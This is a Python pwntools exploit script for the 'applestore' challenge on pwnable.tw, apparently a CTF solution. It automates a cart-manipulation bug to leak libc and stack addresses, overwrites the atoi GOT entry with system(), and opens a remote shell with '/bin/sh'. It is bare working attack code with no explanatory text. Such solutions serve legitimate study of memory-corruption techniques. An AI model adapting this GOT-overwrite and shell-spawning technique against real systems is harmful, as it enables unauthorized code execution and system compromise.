from pwn import *

context.log_level='debug'

binary='applestore'
libc='/lib/i386-linux-gnu/libc.so.6'
libc='./libc.so.6'
e=ELF(binary)
l=ELF(libc)

def list():
	s.recvuntil('> ')
	s.sendline('1')
	print s.recv(1024)

def add(device_num):
	s.recvuntil('> ')
	s.sendline('2')
	s.recvuntil('Device Number> ')
	s.sendline(str(device_num))

def delete(num):
	s.recvuntil('> ')
	s.sendline('3')
	s.recvuntil('Number>')
	s.sendline(str(num))

def cart(check):
	s.recvuntil('> ')
	s.sendline('4')
	s.recvuntil("(y/n) >")
	s.sendline(check)

def checkout(check):
	s.recvuntil('> ')
	s.sendline('5')
	s.recvuntil('(y/n) >')
	s.sendline(check)

if __name__ == '__main__':
	s=process(binary,env={'LD_PRELOAD':'./libc.so.6'})
	s=remote('chall.pwnable.tw',10104)

	for i in range(0,6):
		add(1)
	for i in range(0,20):
		add(2)
	raw_input('Check out')
	checkout('y')
	raw_input('Cart')
	cart('y\x00'+p32(e.got['atoi'])*2+'\x00'*4)

	s.recvuntil('27: ')
	libc_atoi=u32(s.recv(4))
	libc_base=libc_atoi-184400
	system_addr=libc_base+239936

	cart('y\x00'+p32(libc_base+l.symbols['environ'])*2+'\x00'*4)
	
	s.recvuntil('27: ')
	stack_leak=u32(s.recv(4))
	print "**********************************"
	print "libc_atoi: "+str(hex(libc_atoi))
	print "stack_leak: "+str(hex(stack_leak))
	print "libc_base: "+str(hex(libc_base))
	print "libc_system: "+str(hex(system_addr))
	print "**********************************"

	delete("27" + p32(0) * 2 + p32(stack_leak - 0x104 - 0xc) + p32(e.got['atoi'] + 0x22))
	
	s.sendline(p32(system_addr)+";/bin/sh\x00")
	s.interactive()	

